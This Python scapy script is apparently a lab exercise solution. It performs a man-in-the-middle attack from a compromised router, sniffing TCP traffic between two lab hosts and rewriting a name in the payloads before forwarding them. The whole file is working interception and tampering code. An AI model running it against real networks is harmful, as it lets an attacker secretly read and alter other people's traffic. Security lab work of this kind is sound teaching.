#!/usr/bin/env python3
"""
MITM Sniff-and-Spoof - Task 2
Intercepts TCP packets and modifies payload (replaces pattern with same-length substitute).
Run on malicious router with IP forwarding disabled.
"""

from scapy.all import IP, TCP, sniff, send

# Modify these to match your lab setup
REPLACE_PATTERN = b"ashiq"      # Pattern to find in payload (first name)
REPLACE_WITH = b"AAAAA"         # Same-length replacement (preserves TCP seq)

# Filter: capture victim (10.9.0.5) -> target (192.168.60.5) - one direction only
# Use IP filter (not MAC); IP is more reliable in container environments
SNIFF_FILTER = "tcp and host 10.9.0.5 and host 192.168.60.5"
SNIFF_IFACE = "eth0"


def spoof_pkt(pkt):
    """Process captured packet: modify payload and forward."""
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    # Reconstruct packet from raw bytes to avoid reference issues
    newpkt = IP(bytes(pkt[IP]))
    del newpkt.chksum
    del newpkt[TCP].payload
    del newpkt[TCP].chksum

    if pkt[TCP].payload:
        data = bytes(pkt[TCP].payload.load)
        print(f"*** {data!r}, length: {len(data)}")

        # Replace pattern (must preserve length for TCP)
        if REPLACE_PATTERN in data:
            newdata = data.replace(REPLACE_PATTERN, REPLACE_WITH)
            send(newpkt / newdata)
        else:
            # Forward unmodified
            send(newpkt / data)
    else:
        # No payload - forward as-is
        send(newpkt)


def main():
    print("[*] MITM Sniff-and-Spoof running...")
    print(f"    Replacing: {REPLACE_PATTERN!r} -> {REPLACE_WITH!r}")
    print(f"    Filter: {SNIFF_FILTER}")
    print("[*] Ensure: 1) IP forwarding disabled, 2) nc server on 192.168.60.5:9000")
    sniff(iface=SNIFF_IFACE, filter=SNIFF_FILTER, prn=spoof_pkt)


if __name__ == "__main__":
    main()
